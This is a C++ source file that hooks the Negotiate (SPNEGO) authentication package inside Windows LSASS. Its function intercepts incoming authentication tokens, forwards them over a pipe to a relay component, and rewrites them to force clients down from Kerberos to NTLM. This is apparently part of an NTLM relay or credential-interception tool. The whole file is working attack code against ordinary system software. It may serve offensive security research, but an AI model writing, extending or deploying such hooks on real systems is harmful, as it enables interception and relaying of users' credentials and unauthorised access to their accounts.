#include "spnego.hxx"
#include "debug.hxx"

/*
 *  This file handles the hooks for the pseudo Negotiate authentication package.
 *
 *  Negotiate handles all authentication performs via the GSS-API SPNEGO specificaion.
 *  The package essentially is a wrapper around all authentication systes registered
 *  and available within LSASS.  Kerberos generally gets priority over NTLM if possible
 *
 *  Nego_SpAcceptLsaModeContextHook handles the downgrading of incoming SPNEGO requests
 *  to force the connecting client to authenticate via NTLM.  Once this occurs, the
 *  hooks inside the msv1_0.cpp take over, so no active context tracking takes places here.
 *
 */

NTSTATUS Nego_SpAcceptLsaModeContextHook(LSA_SEC_HANDLE CredentialHandle, LSA_SEC_HANDLE ContextHandle, PSecBufferDesc InputBuffer, ULONG ContextRequirements, ULONG TargetDataRep, PLSA_SEC_HANDLE NewContextHandle,
                                    PSecBufferDesc OutputBuffer, PULONG ContextAttributes, PTimeStamp ExpirationTime, PBOOLEAN MappedContext, PSecBuffer ContextData){

    bool allocateMemory = (ContextRequirements & ISC_REQ_ALLOCATE_MEMORY) == ISC_REQ_ALLOCATE_MEMORY;
    SECPKG_CLIENT_INFO clientInfo;
    SECPKG_CALL_INFO callInfo;
    g_FunctionTable->GetClientInfo(&clientInfo);
    g_FunctionTable->GetCallInfo(&callInfo);
    NTSTATUS status;
    bool calledOriginal = false;
    void* originalInput = nullptr;
    int originalInputSize = 0;

    try{
        DBGPRINT(L"ENTRY: CredentialHandle: 0x%llx, ContextHandle: 0x%llx", CredentialHandle, ContextHandle);

        RelayContext ctx(g_messageExchangeFactory, true, clientInfo.ProcessID);

        if(InputBuffer != nullptr && InputBuffer->cBuffers > 0 && InputBuffer->pBuffers[0].cbBuffer > 0){
            DBGPRINT(L"Sending NegotiateCommand over pipe for input buffer 0x%llx", InputBuffer);
            NegotiateCommandResponse response = ctx.ForwardNego((uint64_t)callInfo.CallCount , MessageBuffer((uint8_t*)InputBuffer->pBuffers[0].pvBuffer, (uint8_t*)(DWORD_PTR(InputBuffer->pBuffers[0].pvBuffer) + InputBuffer->pBuffers[0].cbBuffer)));

            if(response.NegotiateBuffer.size() > 0){
                if(response.Status == CommandStatus::Replace){

                    if(InputBuffer->pBuffers[0].cbBuffer < response.NegotiateBuffer.size()){
                        originalInput = InputBuffer->pBuffers[0].pvBuffer;
                        originalInputSize = InputBuffer->pBuffers[0].cbBuffer;
                        InputBuffer->pBuffers[0].pvBuffer = g_FunctionTable->AllocateLsaHeap(response.NegotiateBuffer.size());
                        DBGPRINT(L"Expanded Negotiate input buffer to %d bytes", response.NegotiateBuffer.size());
                    }

                    DBGPRINT(L"Replaced Negotiate input buffer", 0);
                    memcpy(InputBuffer->pBuffers[0].pvBuffer, response.NegotiateBuffer.data(), response.NegotiateBuffer.size());
                    InputBuffer->pBuffers[0].cbBuffer = response.NegotiateBuffer.size();

                }else if(response.Status == CommandStatus::Forward){

                    if(allocateMemory || OutputBuffer->pBuffers[0].cbBuffer >= response.NegotiateBuffer.size()){

                        if(OutputBuffer->pBuffers[0].cbBuffer == 0){
                            OutputBuffer->pBuffers[0].cbBuffer = response.NegotiateBuffer.size();
                            OutputBuffer->pBuffers[0].pvBuffer = g_FunctionTable->AllocateLsaHeap(OutputBuffer->pBuffers[0].cbBuffer);
                        }

                        DBGPRINT(L"Forwarding Negotiate response from client, buffer 0x%llx, size %d", OutputBuffer->pBuffers[0].pvBuffer, response.NegotiateBuffer.size());
                        memcpy(OutputBuffer->pBuffers[0].pvBuffer, response.NegotiateBuffer.data(), response.NegotiateBuffer.size());
                        OutputBuffer->pBuffers[0].BufferType = SECBUFFER_TOKEN;
                        OutputBuffer->pBuffers[0].cbBuffer = response.NegotiateBuffer.size();
                        return SEC_I_CONTINUE_NEEDED;
                    }else{
                        DBGPRINT(L"Not enough space to forward output buffer, require %d got %d", response.NegotiateBuffer.size(), OutputBuffer->pBuffers[0].cbBuffer);
                    }
                }
            }
        }

        status = Nego_SpAcceptLsaModeContext_orig(CredentialHandle, ContextHandle, InputBuffer, ContextRequirements, TargetDataRep, NewContextHandle,
                                            OutputBuffer, ContextAttributes, ExpirationTime, MappedContext, ContextData);
        calledOriginal = true;

        if(originalInput != nullptr){
            InputBuffer->pBuffers[0].pvBuffer = originalInput;
            InputBuffer->pBuffers[0].cbBuffer = originalInputSize;
        }

        if(NT_SUCCESS(status)){

            int32_t tokenIndex;
            GetTokenBufferInfo(OutputBuffer, tokenIndex);

            if(tokenIndex != -1){

                DBGPRINT(L"Sending NegotiateCommand over pipe for output buffer 0x%llx with size %d, buffer count %d", OutputBuffer->pBuffers[tokenIndex].pvBuffer, OutputBuffer->pBuffers[tokenIndex].cbBuffer, OutputBuffer->cBuffers);
                MessageBuffer negoToken((uint8_t*)OutputBuffer->pBuffers[tokenIndex].pvBuffer, (uint8_t*)(DWORD_PTR(OutputBuffer->pBuffers[tokenIndex].pvBuffer) + OutputBuffer->pBuffers[tokenIndex].cbBuffer));
                NegotiateCommandResponse response = ctx.ForwardNego((uint64_t)callInfo.CallCount, negoToken);

                if(response.NegotiateBuffer.size() > 0 && response.Status == CommandStatus::Replace){
                    if(OutputBuffer->pBuffers[tokenIndex].cbBuffer >= response.NegotiateBuffer.size()){
                        DBGPRINT(L"Replaced Negotiate output buffer with NTLM", 0);
                        memcpy(OutputBuffer->pBuffers[tokenIndex].pvBuffer, response.NegotiateBuffer.data(), response.NegotiateBuffer.size());
                        OutputBuffer->pBuffers[tokenIndex].cbBuffer = response.NegotiateBuffer.size();
                    }else{
                        DBGPRINT(L"Not enough space to replace output buffer, require %d got %d", response.NegotiateBuffer.size(), OutputBuffer->pBuffers[tokenIndex].cbBuffer);
                    }
                }

            }else{
                DBGPRINT(L"Orignal SpAcceptLsaModeContext function success but failed to find output token buffer", 0);
            }
        }

    }catch(const std::exception& e){
        DBGPRINT(L"Exception occured when attempting to relay Negotiate: %S", e.what());
    }

    if(!calledOriginal)
        status = Nego_SpAcceptLsaModeContext_orig(CredentialHandle, ContextHandle, InputBuffer, ContextRequirements, TargetDataRep, NewContextHandle,
                                            OutputBuffer, ContextAttributes, ExpirationTime, MappedContext, ContextData);

    DBGPRINT(L"EXIT: Status: 0x%llx, NewContextHandle: 0x%llx", status, *NewContextHandle);
    return status;
}
